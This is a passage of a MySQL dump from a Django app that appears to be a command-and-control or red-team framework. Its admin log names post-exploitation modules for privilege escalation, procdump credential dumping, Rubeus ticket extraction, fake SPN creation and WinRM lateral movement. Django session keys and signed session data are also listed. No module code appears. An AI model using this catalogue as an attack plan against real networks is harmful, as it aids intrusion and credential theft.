(112, '2023-02-09 16:01:18.849774', '1', 'AgentTasks object (1)', 1, '[{\"added\": {}}]', 11, 1),
(113, '2023-02-10 12:40:31.028432', '64', 'Fuff', 1, '[{\"added\": {}}]', 10, 1),
(114, '2023-02-28 21:21:41.372379', '65', 'Active_Dir System Info', 1, '[{\"added\": {}}]', 10, 1),
(115, '2023-02-28 21:21:58.724956', '66', 'Active_Dir DomainInfo', 1, '[{\"added\": {}}]', 10, 1),
(116, '2023-02-28 21:22:06.769366', '67', 'Active_Dir DomainUsers', 1, '[{\"added\": {}}]', 10, 1),
(117, '2023-03-01 12:32:19.755599', '68', 'Download_IWR', 1, '[{\"added\": {}}]', 10, 1),
(118, '2023-03-01 12:32:28.805335', '69', 'DownloadFileAsync', 1, '[{\"added\": {}}]', 10, 1),
(119, '2023-03-01 12:32:39.433614', '70', 'DownloadString', 1, '[{\"added\": {}}]', 10, 1),
(120, '2023-03-01 12:32:45.408341', '71', 'Download_SMB', 1, '[{\"added\": {}}]', 10, 1),
(121, '2023-03-01 12:32:52.783649', '72', 'Download_FTP', 1, '[{\"added\": {}}]', 10, 1),
(122, '2023-03-01 12:32:59.231991', '73', 'Invoke_fileUpload', 1, '[{\"added\": {}}]', 10, 1),
(123, '2023-03-01 12:33:06.859738', '74', 'FTP_fileUpload', 1, '[{\"added\": {}}]', 10, 1),
(124, '2023-03-01 12:33:14.085244', '75', 'open_pythonserver', 1, '[{\"added\": {}}]', 10, 1),
(125, '2023-03-01 12:33:19.996135', '76', 'open_SMBserver', 1, '[{\"added\": {}}]', 10, 1),
(126, '2023-03-01 12:33:26.243248', '77', 'open_FTPserver', 1, '[{\"added\": {}}]', 10, 1),
(127, '2023-03-01 12:33:31.702566', '78', 'open_PY_UploadServer', 1, '[{\"added\": {}}]', 10, 1),
(128, '2023-03-01 12:33:37.199291', '79', 'open_FTP_UploadServer', 1, '[{\"added\": {}}]', 10, 1),
(129, '2023-03-01 12:33:45.252142', '80', 'Perm_pip', 1, '[{\"added\": {}}]', 10, 1),
(130, '2023-03-01 12:33:50.451894', '81', 'printspoofer', 1, '[{\"added\": {}}]', 10, 1),
(131, '2023-03-01 12:33:55.855885', '82', 'procdump', 1, '[{\"added\": {}}]', 10, 1),
(132, '2023-03-01 12:34:01.359665', '83', 'tasklist', 1, '[{\"added\": {}}]', 10, 1),
(133, '2023-03-01 12:34:07.608351', '84', 'Exec_With_Prnt_Priv', 1, '[{\"added\": {}}]', 10, 1),
(134, '2023-03-01 12:34:13.784550', '85', 'Import_Module', 1, '[{\"added\": {}}]', 10, 1),
(135, '2023-03-01 12:34:20.639348', '86', 'Exec_Module', 1, '[{\"added\": {}}]', 10, 1),
(136, '2023-03-01 12:34:25.640465', '87', 'Chk_File_Owner', 1, '[{\"added\": {}}]', 10, 1),
(137, '2023-03-01 12:34:30.654890', '88', 'Take_Own', 1, '[{\"added\": {}}]', 10, 1),
(138, '2023-03-01 12:34:36.165546', '89', 'ACL_modify', 1, '[{\"added\": {}}]', 10, 1),
(139, '2023-03-01 12:34:41.279992', '90', 'SeBackUpPrivelege', 1, '[{\"added\": {}}]', 10, 1),
(140, '2023-03-01 12:38:11.748039', '90', 'SeBackUpPrivelege', 2, '[{\"changed\": {\"fields\": [\"Module type\"]}}]', 10, 1),
(141, '2023-03-01 12:38:25.750518', '87', 'Chk_File_Owner', 2, '[{\"changed\": {\"fields\": [\"Module type\"]}}]', 10, 1),
(142, '2023-03-01 12:38:35.206231', '89', 'ACL_modify', 2, '[{\"changed\": {\"fields\": [\"Module type\"]}}]', 10, 1),
(143, '2023-03-01 12:38:40.741468', '88', 'Take_Own', 2, '[{\"changed\": {\"fields\": [\"Module type\"]}}]', 10, 1),
(144, '2023-03-01 12:38:48.344642', '86', 'Exec_Module', 2, '[{\"changed\": {\"fields\": [\"Module type\"]}}]', 10, 1),
(145, '2023-03-01 12:38:54.201154', '85', 'Import_Module', 2, '[{\"changed\": {\"fields\": [\"Module type\"]}}]', 10, 1),
(146, '2023-03-01 12:38:59.955800', '84', 'Exec_With_Prnt_Priv', 2, '[{\"changed\": {\"fields\": [\"Module type\"]}}]', 10, 1),
(147, '2023-03-01 12:39:14.047696', '83', 'tasklist', 2, '[{\"changed\": {\"fields\": [\"Module type\"]}}]', 10, 1),
(148, '2023-03-01 12:40:17.249754', '82', 'procdump', 2, '[{\"changed\": {\"fields\": [\"Module type\"]}}]', 10, 1),
(149, '2023-03-01 12:40:31.830370', '81', 'printspoofer', 2, '[{\"changed\": {\"fields\": [\"Module type\"]}}]', 10, 1),
(150, '2023-03-01 12:40:46.208279', '68', 'Download_IWR', 2, '[{\"changed\": {\"fields\": [\"Module type\"]}}]', 10, 1),
(151, '2023-03-01 12:40:58.951860', '69', 'DownloadFileAsync', 2, '[{\"changed\": {\"fields\": [\"Module type\"]}}]', 10, 1),
(152, '2023-03-01 12:41:12.402200', '70', 'DownloadString', 2, '[]', 10, 1),
(153, '2023-03-01 12:41:23.058712', '80', 'Perm_pip', 2, '[{\"changed\": {\"fields\": [\"Module type\"]}}]', 10, 1),
(154, '2023-03-01 12:41:34.985524', '79', 'open_FTP_UploadServer', 2, '[{\"changed\": {\"fields\": [\"Module type\"]}}]', 10, 1),
(155, '2023-03-01 12:41:42.281531', '78', 'open_PY_UploadServer', 2, '[{\"changed\": {\"fields\": [\"Module type\"]}}]', 10, 1),
(156, '2023-03-01 12:41:48.636018', '77', 'open_FTPserver', 2, '[{\"changed\": {\"fields\": [\"Module type\"]}}]', 10, 1),
(157, '2023-03-01 12:41:54.255157', '76', 'open_SMBserver', 2, '[{\"changed\": {\"fields\": [\"Module type\"]}}]', 10, 1),
(158, '2023-03-01 12:41:59.139790', '75', 'open_pythonserver', 2, '[{\"changed\": {\"fields\": [\"Module type\"]}}]', 10, 1),
(159, '2023-03-01 12:42:05.153400', '74', 'FTP_fileUpload', 2, '[{\"changed\": {\"fields\": [\"Module type\"]}}]', 10, 1),
(160, '2023-03-01 12:42:11.153984', '73', 'Invoke_fileUpload', 2, '[{\"changed\": {\"fields\": [\"Module type\"]}}]', 10, 1),
(161, '2023-03-01 12:42:16.591968', '72', 'Download_FTP', 2, '[{\"changed\": {\"fields\": [\"Module type\"]}}]', 10, 1),
(162, '2023-03-01 12:42:21.909446', '71', 'Download_SMB', 2, '[{\"changed\": {\"fields\": [\"Module type\"]}}]', 10, 1),
(163, '2023-03-01 12:42:31.938325', '70', 'DownloadString', 2, '[{\"changed\": {\"fields\": [\"Module type\"]}}]', 10, 1),
(164, '2023-03-12 12:58:58.301685', '91', 'SeDebugPriviliege', 1, '[{\"added\": {}}]', 10, 1),
(165, '2023-03-12 13:29:00.014431', '91', 'Auto_SeDebugPrivilege', 2, '[{\"changed\": {\"fields\": [\"Module name\"]}}]', 10, 1),
(166, '2023-03-12 13:29:09.900133', '84', 'SeDebugPrivilege', 2, '[{\"changed\": {\"fields\": [\"Module name\"]}}]', 10, 1),
(167, '2023-05-04 14:34:39.498520', '92', 'linkedin_users', 1, '[{\"added\": {}}]', 10, 1),
(168, '2023-05-04 14:34:54.121009', '93', 'EnumSMBShares', 1, '[{\"added\": {}}]', 10, 1),
(169, '2023-05-04 14:35:09.039962', '94', 'TestingCreds_onDC', 1, '[{\"added\": {}}]', 10, 1),
(170, '2023-05-04 14:35:20.243544', '95', 'userenum_withcreds', 1, '[{\"added\": {}}]', 10, 1),
(171, '2023-05-04 14:36:14.398695', '96', 'fbing', 1, '[{\"added\": {}}]', 10, 1),
(172, '2023-05-04 14:45:28.404517', '97', 'DomainControllers', 1, '[{\"added\": {}}]', 10, 1),
(173, '2023-05-04 14:47:39.436187', '98', 'groupInfo', 1, '[{\"added\": {}}]', 10, 1),
(174, '2023-05-04 14:48:43.839463', '99', 'ImportModule', 1, '[{\"added\": {}}]', 10, 1),
(175, '2023-05-04 14:48:56.451149', '100', 'loggedinUsers', 1, '[{\"added\": {}}]', 10, 1),
(176, '2023-05-04 15:11:21.556127', '101', 'TrustMap', 1, '[{\"added\": {}}]', 10, 1),
(177, '2023-05-04 15:11:39.195829', '102', 'Download_IWR', 1, '[{\"added\": {}}]', 10, 1),
(178, '2023-05-04 15:13:56.407806', '103', 'DownloadString', 1, '[{\"added\": {}}]', 10, 1),
(179, '2023-05-04 15:14:09.279970', '104', 'Download_SMB', 1, '[{\"added\": {}}]', 10, 1),
(180, '2023-05-04 15:14:15.877719', '105', 'Download_FTP', 1, '[{\"added\": {}}]', 10, 1),
(181, '2023-05-04 15:14:22.940889', '106', 'open_pythonserver', 1, '[{\"added\": {}}]', 10, 1),
(182, '2023-05-04 15:14:29.757485', '107', 'open_SMBserver', 1, '[{\"added\": {}}]', 10, 1),
(183, '2023-05-04 15:14:34.301031', '108', 'open_FTPserver', 1, '[{\"added\": {}}]', 10, 1),
(184, '2023-05-04 15:14:38.667446', '109', 'open_PY_UploadServer', 1, '[{\"added\": {}}]', 10, 1),
(185, '2023-05-04 15:14:43.991959', '110', 'open_FTP_UploadServer', 1, '[{\"added\": {}}]', 10, 1),
(186, '2023-05-05 00:21:01.933492', '111', 'UserEnumwithKerbrute', 1, '[{\"added\": {}}]', 10, 1),
(187, '2023-05-14 17:13:20.681408', '118', 'LateralMov', 2, '[{\"changed\": {\"fields\": [\"Module name\"]}}]', 10, 1),
(188, '2023-05-14 21:40:36.443094', '119', 'CreateFake_SPN', 1, '[{\"added\": {}}]', 10, 1),
(189, '2023-05-14 21:47:14.009159', '119', 'CreateFake_SPN', 3, '', 10, 1),
(190, '2023-05-14 21:47:35.522102', '120', 'gpp_Autologin', 1, '[{\"added\": {}}]', 10, 1),
(191, '2023-05-14 21:50:44.885741', '121', 'CreateFake_SPN', 1, '[{\"added\": {}}]', 10, 1),
(192, '2023-05-14 22:05:28.077192', '118', 'LateralMov_WinRM', 2, '[{\"changed\": {\"fields\": [\"Module name\"]}}]', 10, 1),
(193, '2023-05-15 18:20:38.379695', '122', 'TGStickets_Rubeus', 1, '[{\"added\": {}}]', 10, 1);

-- --------------------------------------------------------

--
-- Table structure for table `django_content_type`
--

CREATE TABLE `django_content_type` (
  `id` int(11) NOT NULL,
  `app_label` varchar(100) NOT NULL,
  `model` varchar(100) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `django_content_type`
--

INSERT INTO `django_content_type` (`id`, `app_label`, `model`) VALUES
(1, 'admin', 'logentry'),
(4, 'auth', 'group'),
(3, 'auth', 'permission'),
(5, 'auth', 'user'),
(8, 'blog', 'agent'),
(11, 'blog', 'agenttasks'),
(7, 'blog', 'listenerform'),
(10, 'blog', 'modules'),
(2, 'blog', 'users'),
(6, 'contenttypes', 'contenttype'),
(9, 'sessions', 'session');

-- --------------------------------------------------------

--
-- Table structure for table `django_migrations`
--

CREATE TABLE `django_migrations` (
  `id` bigint(20) NOT NULL,
  `app` varchar(255) NOT NULL,
  `name` varchar(255) NOT NULL,
  `applied` datetime(6) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `django_migrations`
--

INSERT INTO `django_migrations` (`id`, `app`, `name`, `applied`) VALUES
(1, 'contenttypes', '0001_initial', '2022-07-15 14:39:23.613146'),
(2, 'auth', '0001_initial', '2022-07-15 14:39:29.892549'),
(3, 'admin', '0001_initial', '2022-07-15 14:39:31.327884'),
(4, 'admin', '0002_logentry_remove_auto_add', '2022-07-15 14:39:31.378640'),
(5, 'admin', '0003_logentry_add_action_flag_choices', '2022-07-15 14:39:31.411621'),
(6, 'contenttypes', '0002_remove_content_type_name', '2022-07-15 14:39:32.137189'),
(7, 'auth', '0002_alter_permission_name_max_length', '2022-07-15 14:39:32.755496'),
(8, 'auth', '0003_alter_user_email_max_length', '2022-07-15 14:39:32.857956'),
(9, 'auth', '0004_alter_user_username_opts', '2022-07-15 14:39:32.904959'),
(10, 'auth', '0005_alter_user_last_login_null', '2022-07-15 14:39:33.337019'),
(11, 'auth', '0006_require_contenttypes_0002', '2022-07-15 14:39:33.371678'),
(12, 'auth', '0007_alter_validators_add_error_messages', '2022-07-15 14:39:33.412682'),
(13, 'auth', '0008_alter_user_username_max_length', '2022-07-15 14:39:33.498677'),
(14, 'auth', '0009_alter_user_last_name_max_length', '2022-07-15 14:39:33.581678'),
(15, 'auth', '0010_alter_group_name_max_length', '2022-07-15 14:39:33.691686'),
(16, 'auth', '0011_update_proxy_permissions', '2022-07-15 14:39:33.733689'),
(17, 'auth', '0012_alter_user_first_name_max_length', '2022-07-15 14:39:33.858684'),
(18, 'blog', '0001_initial', '2022-07-15 14:39:34.036677'),
(19, 'blog', '0002_delete_users', '2022-07-15 16:13:48.288327'),
(20, 'blog', '0003_initial', '2022-10-20 09:41:31.744758'),
(21, 'blog', '0004_agent', '2022-10-20 09:41:31.768710'),
(22, 'blog', '0005_delete_listenerform_delete_movie_delete_payloadform_and_more', '2022-10-20 09:41:31.808446'),
(23, 'blog', '0006_listenerform_alter_agent_ip', '2022-10-20 09:41:31.888496'),
(24, 'blog', '0007_delete_agent', '2022-10-20 09:41:31.905461'),
(25, 'blog', '0008_agent', '2022-10-20 09:41:31.938424'),
(26, 'sessions', '0001_initial', '2022-10-20 09:41:31.980836'),
(27, 'blog', '0009_alter_listenerform_stoped_date', '2022-11-04 12:36:20.519196'),
(28, 'blog', '0010_modules', '2022-11-30 18:22:05.274373'),
(29, 'blog', '0011_agent_created_date_agent_updated_date', '2022-12-13 16:03:33.175113'),
(30, 'blog', '0012_listenerform_ip', '2022-12-15 13:23:29.914820'),
(31, 'blog', '0013_agent_username', '2022-12-15 15:38:38.312221'),
(32, 'blog', '0014_agenttasks', '2023-02-09 13:16:42.535750'),
(33, 'blog', '0015_agenttasks_task_result', '2023-03-10 14:11:09.521381'),
(34, 'blog', '0016_agenttasks_user', '2023-03-12 12:43:32.617518'),
(35, 'blog', '0017_modules_description_modules_reference', '2023-05-07 00:33:44.896580');

-- --------------------------------------------------------

--
-- Table structure for table `django_session`
--

CREATE TABLE `django_session` (
  `session_key` varchar(40) NOT NULL,
  `session_data` longtext NOT NULL,
  `expire_date` datetime(6) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `django_session`
--

INSERT INTO `django_session` (`session_key`, `session_data`, `expire_date`) VALUES
('03jiik8cr72m2g61wf23y60ie818tquj', '.eJxVjDsOwjAQRO_iGllex_GHkj5niNbeNQ4gW8qnQtydREoB1Ujz3sxbjLitZdwWnseJxFWAuPx2EdOT6wHogfXeZGp1nacoD0WedJFDI37dTvfvoOBS9nUkCio7ZzNqC5zAZ2dcJO07gGQ6bzEo8Crv0TvNUffJkPJsEMhyEJ8v4OU3pQ:1pbLlJ:uFGqugakNqVn7CZsEk6Wy_VB3uYcOjItpruKCfeXsno', '2023-03-26 13:29:21.093404'),
('04w14m5ita1f9xv9v9axjjiolalhltc6', 'eyJhZ2VudE5hbWUiOiJaUUhIUEYifQ:1p739L:7o8HRt3nu1AJsK1zS-uZEMiuViJuHPxoN1ZDRLBciTw', '2023-01-01 23:32:55.793214'),
('09noni4s7f1hdofnpmazu3r4kw04nnam', 'eyJhZ2VudE5hbWUiOiJBWUJDSUkifQ:1pyx3s:InezDO9v2_Z41HCArK3JnyUzKsonCVFhGNpUZsDiElo', '2023-05-30 15:58:04.198463'),
('0covy1688erh2ckwucepvgkrlwzwaplo', 'eyJhZ2VudE5hbWUiOiJSQlBZTVUifQ:1pyK8G:8HZBSrsJjPcY_F7wWInCYhWJ_2Dh-vyU11Y-xgmRSlQ', '2023-05-28 22:24:00.839425'),
('0f09ec8w8tuah2a69etwhpy01ijxz84m', 'eyJhZ2VudE5hbWUiOiJETVJCR1kifQ:1p5vp2:URazYkpL0vgso5WHzBOOTzfEVbkGmtzp3OCZ7t0bays', '2022-12-29 21:31:20.091760'),
('0ijqtc2emedenmudzs3zxzbfnyzmg5tj', 'eyJhZ2VudE5hbWUiOiJKWFRJRVcifQ:1pyh7e:MqWIulbdCHvqbgdv5DSJCAj3wjtbxm5rMs7bcBPA-bQ', '2023-05-29 22:56:54.520237'),
('0urbhoz3dve7tgsamj8bdv66sm6iwor8', 'eyJhZ2VudE5hbWUiOiJSQlBZTVUifQ:1pyJwe:tsgy0VYLacJQY4h7fB0TgeSx_jGbKTUv4L6KaZp7cbk', '2023-05-28 22:12:00.280554'),
('113bvhpl4icqel69rgwsqa22l7ltnir2', '.eJxVjMsOwiAQRf-FtSEy4AAu3fcbyPCSqoGktCvjv0uTLnR7zrn3zRxta3FbT4ubI7sywU6_zFN4prqL-KB6bzy0ui6z53vCD9v51GJ63Y7276BQL2OdowJ51hZiDqABQSUMIRJeSCJSEsJqg5DISrAgCfOwJqhBsgGf2ecL3vM4Nw:1pzI51:jCad7NAf1lrGoE8A3oq8wE2Qx9MktnM3YM5RyDlz49E', '2023-05-31 14:24:39.143826'),
('1krhz3f04zmepxg4gk5lsu33fdhu1med', 'eyJhZ2VudE5hbWUiOiJKWFRJRVcifQ:1pyhWG:YVbDOYvt7DpZ1UE5idldg5pnHFah4ET8diAvmQm5UH0', '2023-05-29 23:22:20.660148'),
('1ntx9vuvtsvu5dj7794h4al52c5mxav2', 'eyJhZ2VudE5hbWUiOiJKWFRJRVcifQ:1pyh4i:DcprYkyLzegkpIGgllhip8kScL8WIuyriL7zNQao1m0', '2023-05-29 22:53:52.640741'),
('22k28x3om29yu60k0rezalav14uks8h0', 'eyJhZ2VudE5hbWUiOiJSQlBZTVUifQ:1pyJeG:3ina1xM8IHBTzlGI-sOAdlUHzoh1wTcQZBtf3AfBHMI', '2023-05-28 21:53:00.225424'),
('26qucgoe0qlxi2qs1esjup15o7d6imbj', 'eyJhZ2VudE5hbWUiOiJWWlBJTFAifQ:1pamA1:8Zwd37inuVOxPH6HvC0efitdGUGebnHsbQqyi6zpE60', '2023-03-24 23:28:29.347240'),
('2dk7tq0dl2frk17xzgfyo76srjrgggv8', 'eyJhZ2VudE5hbWUiOiJSQlBZTVUifQ:1pyKAC:wQOYkpV9Xxmxz05qihcia0U33OBY4LuDK-B0UiJBBJ4', '2023-05-28 22:26:00.984931'),
('2xtlq2f4khdemslja6pjtvy78wvv6rgu', 'eyJhZ2VudE5hbWUiOiJNQVRFTUUifQ:1pZ7Bx:cpW7e4QMLe_xRBB_F2DtQ3FuV6pMIg_3VUhuBAqEKOQ', '2023-03-20 09:31:37.946845'),
('2yh832jpb5zvhodrj3z0vbdm1twl1zt5', 'eyJhZ2VudE5hbWUiOiJNQVRFTUUifQ:1pZ73l:QcyvweTX2wRMLVeEXJYp4CsmpShe6qj5cVC6V5AX0o4', '2023-03-20 09:23:09.257882'),
('39lq2m0r7awwwa243n8guosuc2mipsc9', 'eyJhZ2VudE5hbWUiOiJFV1FETEQifQ:1p73ZV:zx0Dl_EhLgffKiJQ5kp234QOoRDzwAFScTvYjXHOGHs', '2023-01-01 23:59:57.447000'),
('3h6ewm3ba3x4b3cw9nkbjufdcliifq2t', '.eJxVjDEOwyAQBP9CHSEQPgMpU6XxG6yDO4ITy0gGV1H-HltykbQ7s_MWI24tj1vldZxIXIUWl98tYHzxcgB64vIoMpalrVOQhyJPWuVQiOfb6f4FMta8v5MjMAo6sL2LFolBeUboXASVGLH3HrTvDFNIIWrE4MEqdsZbFQjdHm1c216681zE5wsXOjx7:1p719w:Eiw0avoiKsp4VLIeIsE3zU0uWk67Hq4GnbHQhfFiPro', '2023-01-01 21:25:24.274540'),
('3hhqt1m7pm9fgsm19rv4exw9sa06xcg6', 'eyJhZ2VudE5hbWUiOiJFV1FETEQifQ:1p73w1:g_eiJHOcDmgXTPwN9uE-f8_o8IC_f0UEd7hrb7tazlU', '2023-01-02 00:23:13.890029'),
('3o1tmphybx7kh8zcxufm4kjym0bx3p0w', 'eyJhZ2VudE5hbWUiOiJaUUhIUEYifQ:1pNjfG:llpGuOq1cXM-XIueCu8dHAahMpC5TDZJ3clX1_lpWVg', '2023-02-17 00:10:50.635196'),
('3q5os3iq6v1ocz1nt08gpiyhenek8jgh', 'eyJhZ2VudE5hbWUiOiJSQlBZTVUifQ:1pyKE3:KXshUd-wXeZ2JGfilQ3ouK0xPxeWdAYHZPNZ7fVTPzk', '2023-05-28 22:29:59.992974'),
('3xfdoux7fr17y4bpdllbm5f2czpwg3th', 'eyJhZ2VudE5hbWUiOiJKWFRJRVcifQ:1pyhi3:2T-KzCbpBENE-kTYC-2fAP5Irdx0gK3o0WvMPE0WChg', '2023-05-29 23:34:31.199508'),
('4cd7xnjl5y5jqkszmwasy5zkht4flxpn', 'eyJhZ2VudE5hbWUiOiJKWFRJRVcifQ:1pyhTH:lad9dgfOnKOc21T9SYgzP2pzQWanR9QKic5CjaHFMvQ', '2023-05-29 23:19:15.671184'),
('4k50ubsxq9fj1rpgntx1xce24snv5e3h', 'eyJhZ2VudE5hbWUiOiJKWFRJRVcifQ:1pytMD:0hAuE67cpOb8DVKXBjXrxKLmNTH5vp4LSyeswM9oD_Q', '2023-05-30 12:00:45.914022'),
('4yijms521i3sjfm3wamtyhagkzx3w63s', 'eyJhZ2VudE5hbWUiOiJNQVRFTUUifQ:1pZ6yz:NPzhNeP33zNVeoSkMcWigvQWsoLTQxC7ctamfh-_83I', '2023-03-20 09:18:13.681543'),
('5qdhdhplv8y3l21rh5ap71zsfafzfitg', '.eJxVjDsOwjAQBe_iGll21r-lpOcMlj9rHEC2FCcV4u4QKQW0b2bei_mwrdVvgxY_Z3Zmkp1-txjSg9oO8j20W-ept3WZI98VftDBrz3T83K4fwc1jPqtFYBIDi1MQlqFGtHSZECqLK2hkqMhJ4pTRusSAaLTAYW1hChUAgjs_QGfdjZx:1op7g2:LMxm_cR-B8PAcvOTUMXxkPv-OA7NTfC_L5IAhXeVzQ8', '2022-11-13 12:44:34.235275'),
('65hbgr59wfg1aaozop1sdcy028mhbbfx', '.eJxVjEEOwiAQRe_C2hAITAGX7j0DGZhBqgaS0q6Md9cmXej2v_f-S0Tc1hq3wUucSZyFFqffLWF-cNsB3bHdusy9rcuc5K7Igw557cTPy-H-HVQc9VsXT2AUWHCTzw6JQQVGsD6DKow4hQA6WMOUSsoaMQVwir0JTiVCL94f5qs4RQ:1p71QM:X1MceAKDb915APd-8svgjFrFXWc4sTWgVj7LIH5uvxI', '2023-01-01 21:42:22.305996'),
('68w8a4wdrng7rs3saj7fekjoq2eluss5', 'eyJhZ2VudE5hbWUiOiJSQlBZTVUifQ:1pyK7I:CtC19ZQr_SJdoWNnd4IIZl0HrTvBtvzVN9y6bSv88wc', '2023-05-28 22:23:00.652162'),
('69dk5hicqlors9x8wb1b7rmvq9o34ah7', 'eyJhZ2VudE5hbWUiOiJETVJCR1kifQ:1p5qVB:Hi0aejeJc6q-Ri17aezTHSinZDxzaQc88a8EohKBSyg', '2022-12-29 15:50:29.577238'),
('6ombpha0npttx06456lsbcyte2pdvbzs', 'eyJhZ2VudE5hbWUiOiJNQVRFTUUifQ:1pZ7SU:_Rw-d1bhz8dqKoWGdAOD_7VhBT_1lpuqICh40e7mFzU', '2023-03-20 09:48:42.487086'),
('6qa9u5b3qjlrftjwflmekj77mmab6hl4', 'eyJhZ2VudE5hbWUiOiJKWFRJRVcifQ:1pysOZ:FIZm43iP7WDCZ0f0YS-_09BOdEJ662VW6QXfnzf0olA', '2023-05-30 10:59:07.585758'),
('76cyoyoeifxy2jd2kx3vduu0btl3ym9j', '.eJxVjDsOwjAQBe_iGln4l40p6TmDtd61cQDZUpxUiLuTSCmgfTPz3iLgupSw9jSHicVFKHH63SLSM9Ud8APrvUlqdZmnKHdFHrTLW-P0uh7u30HBXrY6KYXMo_MUrTI64whDHhQgqA3x2ZDV7C1g9pqzZe2ZrIvgCVx2hsTnC-f0OAs:1pX7vX:trTElhmppISZbqUgO_-FPRX9koXnFNnGDdSxCGMGbag', '2023-03-14 21:54:27.923812'),
('7d43wzw3iq69ernwtmiwyzcam1mkccje', 'eyJhZ2VudE5hbWUiOiJNQVRFTUUifQ:1pZ6iw:mBH98v5Fev0oNFBaIc1iS3NfalgTQmC8OppHQZ9FuRM', '2023-03-20 09:01:38.900189'),
('7ed2ignogasv35ggmg9us5h1xeukdn5b', 'eyJhZ2VudE5hbWUiOiJWTVpCWFAifQ:1pYyKF:4E28SWMHOc4WkXm-ZmTYxytIUW2zGIO8St55JlAW8hM', '2023-03-20 00:03:35.835815'),
('83jqz85jvm1qbdyqjy0dknve3rt55mte', '.eJxVjDsOwjAQBe_iGln4l40p6TmDtd61cQDZUpxUiLuTSCmgfTPz3iLgupSw9jSHicVFKHH63SLSM9Ud8APrvUlqdZmnKHdFHrTLW-P0uh7u30HBXrY6KYXMo_MUrTI64whDHhQgqA3x2ZDV7C1g9pqzZe2ZrIvgCVx2hsTnC-f0OAs:1pQ8F4:4m6URE6Am8UN2kNzSgl6ZWaK-ic4Er8h4aM1COIw9Y0', '2023-02-23 14:49:42.637533'),
('896nw0nycmm85bf6jnflibqp7pupoo2o', 'eyJhZ2VudE5hbWUiOiJSQlBZTVUifQ:1pxzt5:MnMHfqt72MX9LP7ycwShko8j28Hse6jAnZUoTKCtaWQ', '2023-05-28 00:46:59.787570'),
('8fgbx9b6g1atklpshdeu0d6664154x54', 'eyJhZ2VudE5hbWUiOiJWTVpCWFAifQ:1pYyKW:0rv2XM76DvghAoTPMH5UZGsgbl1kNPrxk4MoMuQLSQQ', '2023-03-20 00:03:52.090563'),
('8ijdimq80ftwrqbf2j6556z5p8fwrjzp', 'eyJhZ2VudE5hbWUiOiJFV1FETEQifQ:1pMHCZ:nVQltl3O1f6bO-EWDI3hOXJBiBNBfi8DI8VyrSGSEQ0', '2023-02-12 23:35:11.984750'),
('8qj7dxqieu2dk5v4pzsb0u3wtamv1d1m', 'eyJhZ2VudE5hbWUiOiJSQlBZTVUifQ:1pyK5L:kQzqp32YNI2fv-QmLYFNCd3lFedTeA2y7CRRODY7A3Q', '2023-05-28 22:20:59.957059'),
('8txylzc9ub35p5xftgvszafz0i2r2m3x', '.eJxVjEEOwiAQRe_C2hAITAGX7j0DGZhBqgaS0q6Md9cmXej2v_f-S0Tc1hq3wUucSZyFFqffLWF-cNsB3bHdusy9rcuc5K7Igw557cTPy-H-HVQc9VsXT2AUWHCTzw6JQQVGsD6DKow4hQA6WMOUSsoaMQVwir0JTiVCL94f5qs4RQ:1p6KDZ:bcD3v0FW8ykWwcCFAv1jLixnycg4iYHEV8FY0MVLP_g', '2022-12-30 23:34:17.920866'),
('93bdnok08a73za0hdi0be6a006nelupm', 'eyJhZ2VudE5hbWUiOiJKWFRJRVcifQ:1pyiOJ:H3ltPmP5zS2wA6eTjNjFqNNjvIxTeY1tKqmV99iTE18', '2023-05-30 00:18:11.627088'),
('9f03bbuvaiz7fp7uqkbmuk2yai05yc76', 'eyJhZ2VudE5hbWUiOiJKWFRJRVcifQ:1pywBr:ZVXVkWsTsb9xMJYdOwqKhEVFtN1b6UbdZCLNBYWrc7E', '2023-05-30 15:02:15.739649'),
('9mu5xksxhxxvgyow4zr76e7j5l31y9qh', '.eJxVjDsOwjAQBe_iGll21r-lpOcMlj9rHEC2FCcV4u4QKQW0b2bei_mwrdVvgxY_Z3Zmkp1-txjSg9oO8j20W-ept3WZI98VftDBrz3T83K4fwc1jPqtFYBIDi1MQlqFGtHSZECqLK2hkqMhJ4pTRusSAaLTAYW1hChUAgjs_QGfdjZx:1oqwCm:kUwZ0hbWFTi6tELkYZs9N6Ryr3jN95y168T5zXOXruo', '2022-11-18 12:53:52.923814'),
('9wllwcjmtbgy6skeqyg4t1f7fhyowutr', 'eyJhZ2VudE5hbWUiOiJSQlBZTVUifQ:1pyKMm:Q_VI4oQuIWVVGBvFASm2CCJnqZmUtQO8U6EpEMRCEEA', '2023-05-28 22:39:00.161307'),
('a0ajsutl85m6ptc46bzlfkuclcss7dju', 'eyJhZ2VudE5hbWUiOiJNQVRFTUUifQ:1pYyPq:YPqYPq7o7M0dVnw-KZ3BJ9Vh6-cOwIVA3hr8kSM9XeQ', '2023-03-20 00:09:22.502188'),
('adfeavhqhhvcdg5xeh7ebourxyytrmp2', 'eyJhZ2VudE5hbWUiOiJKWFRJRVcifQ:1pyiYs:euMvX-Q5iiqo2GTg3A8P99xwv75rGVIBOed_0luPWSo', '2023-05-30 00:29:06.024643'),
('agtppdfij6z4mcoov02ieipxfnfhsnlt', '.eJxVjMsOwiAQRf-FtSEy4AAu3fcbyPCSqoGktCvjv0uTLnR7zrn3zRxta3FbT4ubI7sywU6_zFN4prqL-KB6bzy0ui6z53vCD9v51GJ63Y7276BQL2OdowJ51hZiDqABQSUMIRJeSCJSEsJqg5DISrAgCfOwJqhBsgGf2ecL3vM4Nw:1pzI1H:RyE601h_duYIV5VsaKJDJNnyWKyO6X_ohEBu44kSEI8', '2023-05-31 14:20:47.535452'),
('ami09r9agurb3r9dszqo4ua2uj5egcse', 'eyJhZ2VudE5hbWUiOiJBWUJDSUkifQ:1pysdH:MZjILMVRx_M4vjZ2xRgdBWBw1Kz-cYQ-iX8x94oNfjM', '2023-05-30 11:14:19.905774'),
('aqq5lgaku2m0ehg0o1ujyyrkpm8pxigg', 'eyJhZ2VudE5hbWUiOiJSQlBZTVUifQ:1pyFFf:HNmbvQ3Tnk-OXJuEe_Uv8ubWsqkiYW8IqSUJFQGfRM0', '2023-05-28 17:11:19.681685'),
('asxahoj68y9in2pxxa9e2ketn1l3k58q', 'eyJhZ2VudE5hbWUiOiJWWlBJTFAifQ:1pbK4G:tg9XZgFKONPSw6lgIGTJa0-pGag6YqsZES7TOXqZzBU', '2023-03-26 11:40:48.091294'),
